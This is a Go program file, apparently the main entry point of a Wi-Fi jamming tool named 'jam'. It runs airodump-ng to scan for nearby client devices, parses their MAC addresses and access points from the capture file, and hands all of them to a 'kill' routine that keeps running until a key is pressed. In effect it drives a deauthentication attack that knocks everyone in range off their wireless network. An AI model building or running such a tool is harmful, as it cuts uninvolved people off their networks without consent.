package main

import (
    "fmt"
    "sync"
    //"time"
    "github.com/mstripling/jam/internal/async"
    "github.com/mstripling/jam/internal/cook"
    "github.com/mstripling/jam/internal/setup"
    "github.com/mstripling/jam/internal/kill"
    "github.com/eiannone/keyboard"
)


func main(){
    wifiCardName := setup.Setup()
    fmt.Println("setup completed")
    
    async.Sync("mkdir dump")
    fmt.Println(wifiCardName)
    dumpScan := fmt.Sprintf("sudo airodump-ng -w dump/dump %s", wifiCardName)
    // phase 1
    fmt.Println("dumpScan created")
    // change this later for the only .csv file that not kiss whatever
    dumpFilePath := "/home/miles/go/jam/dump/dump-01.csv"
    /*
    outputChan := make(chan string, 100)
    stopChan := make(chan struct{})
    fmt.Println("output and stopchan created")
    
    var wg sync.WaitGroup

    wg.Add(1)
    //async.AsyncSimpleDelay(dumpScan, 10)   
    go async.Async(dumpScan, 0, &wg, outputChan,stopChan)
    timer := time.NewTimer(60 * time.Second)
    defer timer.Stop()

    go func() {
        select{
        case <-timer.C:
            close(stopChan)
            fmt.Println("stopChan closed after 30 sec")
        }
    }()
    */
    async.SimpleDelay(dumpScan, 30)
    //hard coded file path
    cleanedCSV := "/home/miles/go/jam/cleaned.csv"
    // keep as is
    keyword := "Station MAC"
    if err := cook.CleanCSV(dumpFilePath, cleanedCSV, keyword); err != nil {
        fmt.Println("Error:", err)
    }
    devices, err := cook.ReadCSV(cleanedCSV)
    if err != nil {
        fmt.Println("Error:", err)
    }
    
    // completely optional
    for _, device := range devices {
        fmt.Printf("MAC: %s, BSSID: %s\n", device.MAC, device.BSSID)
    }

    fmt.Printf("Devices stored before strip: %s\n", len(devices))
    devices = cook.Strip(devices)
    fmt.Printf("Devices stored after strip: %s\n", len(devices))

    stopChan := make(chan struct{})
    var wg sync.WaitGroup
    wg.Add(1)
    fmt.Println("Killing initiated")
    go kill.Kill(devices,10,wifiCardName,stopChan,&wg)
    /*
    go func() {
        select{
        case <-timer.C:
            close(stopChan)
            fmt.Println("stopChan closed after 30 sec")
        }
    }()
    */
    go func(){
        err := keyboard.Open()
        if err != nil{
            panic(err)
        }
        defer keyboard.Close()

        fmt.Println("Press 'q' to stop...")
        for {
            char, key, err := keyboard.GetKey()
            if err != nil {
                panic(err)
            }
            if key == keyboard.KeyEsc || char == 'q' {
                stopChan <- struct{}{}
                break
            }
        }
    }()


    wg.Wait()
    fmt.Println("post wg.Wait()")
    //clean up
    // hard coded wifi card name
    // listen to a key and execute code below
    toManagedCommand := fmt.Sprintf("sudo airmon-ng stop wlp4s0mon") //%s", wifiCardName)
    async.Sync(toManagedCommand)
    async.Sync("clear")

    fmt.Println("All workers done.")
}
//commands := []string{
//    dumpScan,
//    "pwd"}
//var wg sync.WaitGroup
//
//for _, cmd := range commands {
//    wg.Add(1)
//    go async.Sync(cmd, &wg)
//}
//wg.Wait()
